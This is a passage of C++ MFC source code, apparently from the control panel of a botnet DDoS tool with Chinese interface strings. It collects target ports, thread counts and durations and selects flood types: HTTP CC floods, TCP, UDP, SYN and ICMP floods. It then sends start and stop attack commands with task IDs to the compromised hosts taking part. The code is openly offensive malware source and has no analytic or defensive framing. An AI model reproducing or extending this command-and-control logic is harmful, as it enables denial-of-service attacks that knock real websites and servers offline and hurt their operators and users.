				TCHAR Param[100] = { NULL };
				//获取端口
				m_TargetList.GetItemText(i, 1, Param, 100);
				m_Attack.AttackPort = _tstoi(Param);

				//获取线程数
				m_TargetList.GetItemText(i, 3, Param, 100);
				m_Attack.AttackThread = _tstoi(Param);

				//获取时间
				m_TargetList.GetItemText(i, 4, Param, 100);
				m_Attack.AttackTime = _tstoi(Param);

				//计算类型..
				CString szType;
				szType = m_TargetList.GetItemText(i, 5);

				if (szType == _T("网站: 变异CC"))
				{
					m_Attack.AttackType = ATTACK_CCFLOOD;
					//构建HTTP请求包..
					FilterCCString(m_Attack.Target, m_Attack, m_Attack.AttackPort);
				}
				if (szType == _T("网站: 模拟 IE"))
					m_Attack.AttackType = ATTACK_IMITATEIE;

				if (szType == _T("网站: 轮回CC"))
				{
					m_Attack.AttackType = ATTACK_LOOPCC;
					FilterCCString(m_Attack.Target, m_Attack, m_Attack.AttackPort);

					//分解参数...
					m_TargetList.GetItemText(i, 6, Param, 100);

					TCHAR* Point = _tcsstr(Param, _T("-"));
					TCHAR temp[10] = { NULL };
					_tcsnccpy_s(temp, Param, lstrlen(Param) - lstrlen(Point));
					Point++;

					m_Attack.ExtendData1 = _tstoi(temp);
					m_Attack.ExtendData2 = _tstoi(Point);

				}
				if (szType == _T("流量: TCP FLOOD"))
					m_Attack.AttackType = ATTACK_TCPFLOOD;
				if (szType == _T("流量: UDP FLOOD"))
					m_Attack.AttackType = ATTACK_UDPFLOOD;
				if (szType == _T("服务器: SYN FLOOD"))
					m_Attack.AttackType = ATTACK_SYNFLOOD;
				if (szType == _T("服务器: ICMP FLOOD"))
					m_Attack.AttackType = ATTACK_ICMPFLOOD;
				if (szType == _T("其他: 智能模式"))
					m_Attack.AttackType = ATTACK_BRAINPOWER;

				//获取参与主机..
				CString szHost = m_TargetList.GetItemText(i, 2);
				INT HostNums = -1;
				if (szHost != _T("选中主机"))
					HostNums = _tstoi(szHost.GetBuffer(0));


				//获取任务ID
				WORD Task = 0;
				CString  szTask = m_TargetList.GetItemText(i, 8);
				Task = _tstoi(szTask.GetBuffer(0));

				if (Point == NULL)
				{
					MessageBox(_T("初始化失败 请重启软件!"));
					return;
				}

				CDDOSAttackDlg* m_Point = (CDDOSAttackDlg*)Point;
				WORD Ret = m_Point->SendDDosAttackCommand(&m_Attack, HostNums, Task);

				CDDOSAttackDlg* m_AttackPoint = (CDDOSAttackDlg*)Point;
				CString szShow;
				szShow.Format(_T("成功发送 %d 条开始命令 任务ID:%d"), Ret, Task);
				m_AttackPoint->StatusTextOut(0, szShow);

				m_TargetList.SetItemText(i, 7, _T("攻击中"));
			}
		}
	}
}

void CWebAttackDlg::OnStop()
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 7);
			if (str == _T("空闲"))
			{
				MessageBox(_T("报告 目标并未开始 无法停止!"), _T("提示"), MB_OK | MB_ICONINFORMATION);
				return;
			}
			else
			{
				CDDOSAttackDlg* m_Point = (CDDOSAttackDlg*)Point;

				//获取任务ID
				WORD Task = 0;
				CString  szTask = m_TargetList.GetItemText(i, 8);
				Task = _tstoi(szTask.GetBuffer(0));

				WORD Ret = m_Point->SendDDostStopCommand(Task);


				CDDOSAttackDlg* m_AttackPoint = (CDDOSAttackDlg*)Point;
				CString szShow;
				szShow.Format(_T("成功发送 %d 条停止命令 任务ID:%d"), Ret, Task);
				m_AttackPoint->StatusTextOut(0, szShow);

				m_TargetList.SetItemText(i, 7, _T("空闲"));
			}
		}

	}
}



void CWebAttackDlg::OnDeleteList()
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 7);
			if (str == _T("攻击中"))
			{
				MessageBox(_T("报告 目标已经攻击中! 无法删除!请先停止再删除!"), _T("提示"), MB_OK | MB_ICONINFORMATION);
				return;
			}
			m_TargetList.DeleteItem(i);
		}
	}
}
